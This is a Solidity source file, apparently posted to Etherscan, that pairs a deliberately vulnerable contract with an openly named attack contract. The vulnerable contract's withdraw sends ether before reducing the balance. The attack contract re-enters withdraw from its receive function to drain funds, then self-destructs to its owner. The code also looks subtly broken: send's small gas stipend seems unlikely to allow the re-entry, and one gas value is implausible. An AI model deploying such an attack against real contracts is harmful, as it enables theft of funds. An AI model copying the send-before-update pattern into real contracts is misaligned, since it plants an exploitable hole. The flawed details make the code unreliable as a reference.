/**
 *Submitted for verification at Etherscan.io on 2022-01-25
*/

pragma solidity 0.8.7;

contract VulnContract {
    mapping (address => uint256) public balances;
    address owner;

    constructor() payable {
        owner = msg.sender;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amt) public {
        require(balances[msg.sender] >= _amt);
        
        bool success = payable(msg.sender).send(_amt);
        if (success){
            balances[msg.sender] -= _amt;
        }
    }
}

contract MaliciousContract {
    VulnContract public vulnContract;
    address owner;

    event Log(address indexed sender, uint256 amt, uint256 bal);

    constructor(VulnContract _vulnContract){
        owner = msg.sender;
        vulnContract = _vulnContract;
    }

    function attack() public payable {
        vulnContract.deposit{value: 1 ether, gas: 30000000000}();
        vulnContract.withdraw(1 ether);
    } 

    receive () external payable {
        emit Log(msg.sender, msg.value, address(this).balance);
        vulnContract.withdraw(1 ether);
        selfdestruct(payable(owner));
    }
}